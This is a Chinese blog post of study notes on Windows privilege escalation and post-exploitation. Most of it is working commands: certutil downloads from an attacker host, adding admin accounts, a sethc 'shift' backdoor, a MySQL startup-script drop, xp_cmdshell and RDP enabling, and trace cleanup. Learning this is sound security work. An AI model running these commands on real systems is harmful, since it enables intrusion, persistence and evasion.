---
layout:     post
title:      权限提升（一）Windows提权
subtitle:   这个系列是整理学习安全的笔记，记录一些学习到的提权的知识，还有一些提权相关工具的使用，脚本可能不会贴源码，因为都是从别人搜集的开源exp中拿过来用的，已知出处的会附加链接。本章是记录Windows提权，可能不全，只是前段时间蹭课学到记录下来的。
date:       2020-12-24
author:     HouKC
header-img: img/post-bg-art.jpg
catalog:    true
tags:
    - CTF
    - windows
    - 网络安全
    - 学习笔记
    - 权限提升
    - 漏洞利用
---



## 0x00 什么是提权

主要针对网站测试过程中，当测试某一网站时，通过各种漏洞提升Webshell权限，以夺得服务器系统权限。



## 0x01 有用的知识点

#### 1. 通常脚本所处的权限

- asp/php    匿名权限
- aspx    user权限
- jsp    通常是系统权限

#### 2. 突破cmd受限

目标windows可能存在如下几种情况限制了cmd的调用执行：

- 防护软件拦截
- cmd被降权
- 组件被删除


突破的方法是：找可读写目录上传cmd.exe，将执行的cmd.exe路径替换成上传的路径，再次调用执行。

#### 3. windows靶机下载文件

首先在本地起一个HTTP服务，用python3示例：

```
python -m http.server 4444
```

假设本地的IP为192.168.1.115（靶机要访问得到），接着在靶机运行下面命令。

```powershell
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt c:\a.txt          # 下载链接中的robots.txt文件保存到c盘a.txt文件中  
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete            # 清理缓存
```



## 0x02 后渗透的一般流程和思路

拿到webshell后要做的事情：

- 服务器信息搜集（系统信息、端口扫描等）
- 提权（利用数据库漏洞、系统漏洞、第三方软件漏洞等）
- 提权后可以创建系统账户、开放远程桌面、关闭防火墙等进一步控制
- 内网信息搜集（IP段\&端口扫描、域信息搜集等）
- 找其他服务器及其开放的服务（windows最重要的是找到域控服务器）
- 控制并提权其他服务器（利用各种服务漏洞、系统漏洞或者站点漏洞等控制并提权）
- 需要时应做端口转发或者建立反向shell（绕过防火墙）
- 权限维持（可以用CS集中控制shell）



## 0x03 信息搜集

- 内外网
- 服务器系统和版本、位数
- 服务器的补丁情况
- 服务器的安装软件情况
- 服务器的防护软件情况
- 端口情况
- 支持脚本情况
- ......

```
ipconfig /all 	# 查看当前ip
net user 		# 查看当前服务器账号情况
netstat -ano 	# 查看当前服务器端口开放情况
ver 			# 查看当前服务器操作系统
systeminfo 		# 查看当前服务器配置信息（补丁情况）
wmic qfe get Caption,Description,HotFixID,InstalledOn		# 获取系统补丁信息
taskkill -PID [pid号] 		   # 结束某个pid号的进程
taskkill /im qq.exe /f 			# 结束QQ进程
net user abc 123 /add 			# 添加一个用户名为abc密码为123的用户
net localgroup administrators abc /add 		# 将用户abc添加到管理员组
whoami 			# 查看当前操作用户（当前权限）
hostname		# 查看当前计算机名称
query user		# 查看管理员是否在线
msg administrator who are you	# 发送信息“who are you”给管理员

# 获取防火墙有关信息(仅用于XP SP2及更高版本)：
netsh firewall show state
netsh firewall show config

# 获取所有计划任务的详细输出（需要先设置为美国编码437，默认是中文编码936）：
chcp 437
schtasks /query /fo LIST /v

获取主机名运行的进程：
tasklist /SVC
- 看杀软    360，主动防御、火绒(usysdiag.exe进程)
- 看其他软件提权     tomcat（权限高）、iis（权限低）、redius提权等
```



## 0x04 windows常见提权方式

#### 1. 普通账户提权

- 第三方软件提权
- 溢出提权
- 启动项提权
- 破解hash提权
- 数据库提权

#### 2. 域内提权

- PTH
- ms14-068域内提权
- CVE-2020-1472
- kekeo 域内主机提权



## 0x05 第三方软件提权

#### 1. 常见第三方软件提权

- FTP软件：server-u、g6ftp、Filezilla

- 远程管理软件：PCanywhere、radmin、vnc

#### 2. server-u提权

- 有修改权限
	- 检查是否有可写权限 修改server-u默认安装目录下的ServUDaemon.ini
	- 增加用户，该用户拥有管理员权限
	- 连接新用户
	- 执行命令
	

增加新用户的命令如下：

```shell
quote site exec net user abc 123 /add
quote site exec net localgroup administrators abc /add
```

- 无修改权限

首先暴力破解md5，然后进行溢出提权。

#### 3. G6ftp提权

- 下载管理配置文件，将administrator管理密码破解。

- 使用lcx端口转发（默认只允许本机连接）。

```shell
lcx.exe -tran 8027 127.0.0.1 9999
```

- 使用客户端以管理员用户登录。

- 创建用户并设置权限和执行的批处理文件xxx.bat。

- 上传批处理，并命名批处理命令为xxx。

- 以创建的普通用户登录ftp。

- 执行命令。

```shell
......>ftp 192.168.1.100	# 这里在本地的命令行或终端ftp
......
User(...):abc		# 这里输入新建用户名
...
Password:		# 这里输入新建用户的密码
...logged in.
ftp> quote site xxx		# 这里执行批处理命令xxx即可
...command executed.
ftp>
```
xxx.bat内容为添加系统用户，如下：

```
net user abc 123 /add
net localgroup administrators abc /add
```

#### 4. Filezilla提权
- 简介

Filezilla是一款开源的FTP服务器和客户端的软件。

若安装了服务器端默认只监听127.0.0.1的14147端口，并且默认安装目录下有两个敏感文件filezillaserver.xml（包含了用户信息）和filezillaserver interface.xml（包含了管理信息）。

- 提权思路
	- 下载这两个文件，拿到管理密码。
	- 配置端口转发，登录远程管理ftpserver，创建ftp用户。
	- 分配权限，设置家目录为`C:\`。
	- 使用cmd.exe改名为sethc.exe替换`C:\windows\system32\sethc.exe`生成shift后门
	- 连接3389按5次shift调出cmd.exe

#### 5. pcanywhere提权
- 访问pcanywhere默认安装目录
- 下载用户配置文件
- 通过破解账户密码文件

#### 6. radmin提权
- 通过端口扫描，扫描4899端口
- 上传radmin.asp木马读取radmin的加密密文
- 使用工具连接（如一些大马，目前找到的大马没有，但看别人有）

#### 7. vnc提权
- 通过读取注册表十进制数
- 转换成十六进制数
- 破解十六进制数得到密码

```shell
vncx4.exe -W
```

- 逐个输入转换后的十六进制数（输一个十六进制数就回车），即可破解得到密码。
- 连接vnc

注：学习的时候我没找到这个工具，但是找了另一个可以替换用一下，**K8fuckVNC4.exe**。



## 0x06 溢出提权

#### 1. 简介

溢出提权主要是通过windows漏洞利用来获取系统权限。

#### 2. 常见的溢出提权

- 巴西烤肉
- pr

#### 3. 步骤

- 通过信息收集查看服务器打了哪些补丁
- 根据未打补丁漏洞进行利用即可（可以利用GetRoot Tools.exe查找漏洞）



## 0x07 启动项提权

#### 1.查看数据库中有哪些数据表

```mysql
show tables;
```

默认情况下，test数据库中没有任何表的存在。

#### 2.在TEST数据库下创建一个新的表

```mysql
create table a(cmd text);
```

创建了一个表名为a，表中只存放一个字段，字段名为cmd，类型时text文本。

#### 3.在表中插入内容

```mysql
insert into a values("set wshshell=createobject (""wscript.shell"")");
insert into a values("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");
insert into a values("b=wshshell.run(""cmd.exe /c net localgroup Administrators 1 /add"",0)");
```

注意双引号和括号以及后面的“0”一定要输入！这三条命令建立一个VBS脚本程序。

#### 4.查看表a

```mysql
select * from a;
```

表中有三行数据，就是前面输入的内容，确认输入无误后继续往下。

#### 5.输出表为一个VBS的脚本文件

```mysql
select * from a into outfile "C://Users//User//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//a.vbs";
```

#### 6.重启即可



## 0x08 破解hash提权

#### 1. 所需工具

- pwdump7.exe（windows Hash密码导出工具）

- LC5.exe（windows Hash密码破解工具）
- 彩虹表（哈希链集，用于破解hash）
- getpass.exe（windows Hash密码破解一条龙，但我在网上找到的都运行不了）

#### 2. 步骤

- 上传pwdump7.exe运行获取hash值
- 拿到LC5、彩虹表中破解即可得到管理员密码（需要管理员权限才能执行读取hash操作）



## 0x09 Mssql数据库提权
#### 1. 前提条件

需要具备数据库管理员权限才可执行提权操作。

sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。

#### 2. 提权步骤

- 安装xp_cmd_shell
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
```

最后清理痕迹时可以删除组件：

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE
```

- 开启3389
```
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;-- 
```

或者

```
exec master..xp_cmdshell 'sc config termservice start=auto';
exec master..xp_cmdshell 'net start termservice';
exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f';        # 允许外部连接
```

最后清理痕迹时可以关闭3389：

```
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;
```

- 新建管理员用户并连接

```
exec master..xp_cmdshell 'net user abc 123 /add';exec master..xp_cmdshell 'net localgroup administrators abc /add';
```

创建新用户abc并添加到管理员组，远程连接管理员用户即可。

- 拿本地账户Administrator的密码

方案一：

方案二：

#### 3. sa账号的获取

可以通过查看config.asp、conn.asp等文件

如果是aspx，可能在web.config文件



## 0x0a MySQL数据库提权

#### 1. 前提条件

需要具备数据库管理员权限才可执行提权操作。

sqlmap判断数据库是否为管理员权限的方法：用`--is-dba`参数，输出结果为true即管理员权限。



## 0xff 常见windows存在的漏洞端口

- 445 ms17-010 永恒之蓝（windows 10 以前）
- 3389 CVE-2019-0708 BlueKeep（windows7/windows2008）
- 445 ms08-067（windows2008以前）